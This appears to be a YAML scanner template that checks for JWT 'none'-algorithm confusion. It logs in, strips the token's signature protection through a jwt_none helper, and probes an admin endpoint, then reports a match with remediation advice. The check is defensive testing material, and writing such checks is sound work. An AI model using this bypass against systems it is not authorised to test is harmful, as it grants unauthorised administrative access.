id: generic-jwt-none-algorithm
info:
  name: JWT None Algorithm Confusion
  description: Tests for JWT algorithm confusion vulnerability (none algorithm)
  tags:
    - jwt
    - authentication
    - generic

variables:
  # These will be resolved from config
  login_user: "{{AUTH_USERNAME}}"
  login_password: "{{AUTH_PASSWORD}}"

requests:
  - name: Authenticate to get JWT
    method: POST
    path: "{{login_endpoint}}"
    headers:
      Content-Type: "application/json"
    body: '{"username": "{{login_user}}", "password": "{{login_password}}"}'
    extractors:
      - type: json
        name: original_token
        selector: "{{jwt_token_selector}}"

  - name: Test admin endpoint with none algorithm token
    method: GET
    path: "{{admin_endpoint}}"
    headers:
      Authorization: "Bearer {{jwt_none(original_token)}}"
    matchers:
      - type: status
        values: [200]
      - type: word
        words: ["success", "data", "config", "admin"]
        condition: or
    on_match:
      vulnerability: JWT_ALGORITHM_CONFUSION
      message: Server accepts JWT with 'none' algorithm - critical signature bypass vulnerability
      remediation: Reject 'none' algorithm and always verify signatures
      evidence_strength: direct_observation
